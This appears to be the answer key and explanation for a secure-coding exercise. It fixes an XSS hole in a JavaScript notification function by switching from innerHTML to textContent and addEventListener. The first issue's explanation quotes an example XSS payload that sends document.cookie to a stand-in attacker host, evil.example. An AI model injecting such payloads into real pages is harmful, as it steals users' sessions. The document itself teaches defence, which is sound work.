## Reference solution

```javascript
// ------------------------------------------------------------------------
// ANSWER — Template String innerHTML XSS Vector
// ------------------------------------------------------------------------

const container = document.getElementById('notifications');

function showNotification(message, type = 'info') {
  const toast = document.createElement('div');
  toast.className = `toast toast--${type}`;

  const icon = document.createElement('span');
  icon.className = 'toast__icon';
  // CHANGE 1: use textContent instead of innerHTML so the icon string is never parsed as HTML
  icon.textContent = type === 'error' ? '✖' : 'ℹ';

  const msg = document.createElement('span');
  msg.className = 'toast__message';
  // CHANGE 1: assign message via textContent so the browser treats it as plain text, neutralising any HTML/script payload
  msg.textContent = message;

  // CHANGE 2: create the close button in JS and attach the handler with addEventListener, removing the inline onclick attribute injection vector
  const closeBtn = document.createElement('button');
  closeBtn.className = 'toast__close';
  closeBtn.textContent = '\u00d7';
  closeBtn.addEventListener('click', () => toast.remove());

  toast.appendChild(icon);
  toast.appendChild(msg);
  toast.appendChild(closeBtn);

  container.appendChild(toast);

  setTimeout(() => {
    if (toast.parentElement) toast.remove();
  }, 5000);
}

module.exports = { showNotification };
```

## Explanation

### Issue 1: Unsanitized Message Injected via `innerHTML`

**Problem:** `message` is dropped directly into a template-literal string that is then assigned to `toast.innerHTML`. A message such as `<img src=x onerror=fetch('https://evil.example/c?'+document.cookie)>` executes immediately when the browser parses the HTML, leaking the session cookie to an attacker-controlled server.

**Fix:** Two `createElement` + `textContent` assignments replace the entire `innerHTML` template. `msg.textContent = message` and `icon.textContent = ...` are the specific lines that close the hole.

**Explanation:** When you write to `innerHTML`, the browser runs its HTML parser on the string. Any tags or event-handler attributes in that string become real DOM nodes and fire real events. `textContent`, by contrast, bypasses the parser entirely — the browser treats every character as literal text and escapes it on your behalf. So `<script>` becomes the visible string `<script>` in the rendered output rather than an executed script element. The risk here is acute because the `message` value can originate from server-stored data (a filename, comment text) that the server returns verbatim, meaning one user can craft a payload that runs in every other user's session when the notification fires.

---

### Issue 2: Inline `onclick` Attribute as Secondary Injection Surface

**Problem:** The close button is built by interpolating the string `onclick="this.parentElement.remove()"` into the `innerHTML` template. If a strict Content Security Policy blocks inline event handlers (which is the recommended defence-in-depth posture), the button silently stops working. More critically, the pattern normalises mixing executable strings into markup, making the codebase harder to audit.

**Fix:** `closeBtn.addEventListener('click', () => toast.remove())` replaces the inline attribute. The button element is constructed with `document.createElement` and appended manually, so no string-to-HTML parsing is involved at all.

**Explanation:** Inline `onclick` attributes are strings that the HTML parser converts into event-handler functions. A CSP with `script-src` that omits `'unsafe-inline'` silently drops them, breaking the UI without any visible error in most browsers. Using `addEventListener` attaches the handler in JavaScript where it is a real function reference, not a string eval — it works under strict CSPs and is not affected by whatever is in the surrounding template literal. The broader principle: once you remove `innerHTML` (Issue 1), building child elements with `createElement` and appending them keeps every piece of content in typed DOM APIs rather than in parser-executed strings, which makes the security boundary clear and auditable.
